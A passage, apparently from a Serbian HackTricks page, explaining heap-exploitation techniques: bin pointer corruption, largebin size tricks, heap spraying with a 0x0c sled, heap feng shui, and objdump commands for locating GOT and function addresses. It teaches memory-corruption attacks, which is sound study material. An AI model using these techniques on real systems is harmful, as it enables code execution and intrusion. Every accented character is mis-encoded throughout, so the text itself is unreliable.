Nakon Å¡to se modifikovani komad oslobodi, potrebno je rezervisati komad veÄ‡i od osloboÄ‘enog, tako da modifikovani komad izaÄ‘e iz unsorted binova i ubaci se u svoj bin.

Kada se naÄ‘e u svom binu, vreme je da se promeni njegov pokazivaÄ bk preko prelivanja kako bi pokazivao na adresu koju Å¾elimo da prepisujemo.

Tako bin mora da saÄeka da se dovoljno puta pozove malloc() kako bi se ponovo koristio modifikovani bin i prevario bin tako Å¡to Ä‡e mu se reÄ‡i da je sledeÄ‡i komad na laÅ¾noj adresi. Zatim Ä‡e biti dat komad koji nas zanima.

Da bi se ranjivost izvrÅ¡ila Å¡to je pre moguÄ‡e, idealno bi bilo: Rezervacija ranjivog komada, rezervacija komada koji Ä‡e se modifikovati, osloboÄ‘enje ovog komada, rezervacija komada veÄ‡eg od onog koji Ä‡e se modifikovati, modifikacija komada (ranjivost), rezervacija komada iste veliÄine kao ranjivi i rezervacija drugog komada iste veliÄine koji Ä‡e pokazivati na odabranu adresu.

Za zaÅ¡titu od ovog napada koristi se tipiÄna provera da komad "nije" laÅ¾an: proverava se da li bck->fd pokazuje na Å¾rtvu. Drugim reÄima, u naÅ¡em sluÄaju, ako pokazivaÄ fd\* laÅ¾nog komada pokazuje na Å¾rtvu na stacku. Da bi prevaziÅ¡ao ovu zaÅ¡titu, napadaÄ bi trebalo da bude sposoban da na neki naÄin (verovatno preko stacka) upiÅ¡e u odgovarajuÄ‡u adresu adresu Å¾rtve. Tako Ä‡e izgledati kao pravi komad.

**Korupcija LargeBin**

Potrebni su isti zahtevi kao i pre i joÅ¡ neki, osim toga, rezervisani komadi moraju biti veÄ‡i od 512.

Napad je kao i prethodni, tj. treba promeniti pokazivaÄ bk i potrebne su sve te pozive malloc(), ali takoÄ‘e treba promeniti veliÄinu modifikovanog komada tako da taj size - nb bude < MINSIZE.

Na primer, treba postaviti size na 1552 kako bi 1552 - 1544 = 8 < MINSIZE (oduzimanje ne sme biti negativno jer se uporeÄ‘uje sa unsigned)

TakoÄ‘e je uveden zakrpa da bi se to uÄinilo joÅ¡ komplikovanijim.

**RasprÅ¡ivanje Heap-a**

Osnovna ideja je rezervisati Å¡to je viÅ¡e moguÄ‡e memorije za heap-ove i popuniti ih jastukom od nopsa zavrÅ¡enim shellcode-om. TakoÄ‘e, kao jastuk se koristi 0x0c. PokuÅ¡aÄ‡e se skoÄiti na adresu 0x0c0c0c0c, pa ako se neka adresa prepiÅ¡e sa ovim jastukom, skoÄiÄ‡e se tamo. Osnovna taktika je rezervisati Å¡to je viÅ¡e moguÄ‡e kako bi se videlo da li je neki pokazivaÄ prekoraÄen i skoÄiti na 0x0c0c0c0c u nadi da Ä‡e tamo biti nops.

**Feng Shui Heap-a**

Sastoji se u cementiranju memorije putem rezervacija i oslobaÄ‘anja kako bi se ostavili rezervisani komadi izmeÄ‘u slobodnih komada. Bafer za prelivanje Ä‡e se nalaziti u jednom od tih komada.

**objdump -d izvrÅ¡iv** â€”> Disas funkcije\
**objdump -d ./PROGRAMA | grep FUNKCIJA** â€”> Dobijanje adrese funkcije\
**objdump -d -Mintel ./shellcodeout** â€”> Da biste videli da li je zaista naÅ¡ shellcode i izvukli OpCodes\
**objdump -t ./exec | grep varBss** â€”> Tabela simbola, za izvlaÄenje adrese promenljivih i funkcija\
**objdump -TR ./exec | grep exit(func lib)** â€”> Da biste izvukli adresu funkcija biblioteka (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** â€”> IzvlaÄi adresu puts koja Ä‡e biti prepisana u GOT\
**objdump -D ./exec** â€”> Disas sve do ulaza plt\
**objdump -p -/exec**\
**Info functions strncmp â€”>** Info o funkciji u gdb

## Interesantni kursevi

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Reference**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF-u** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
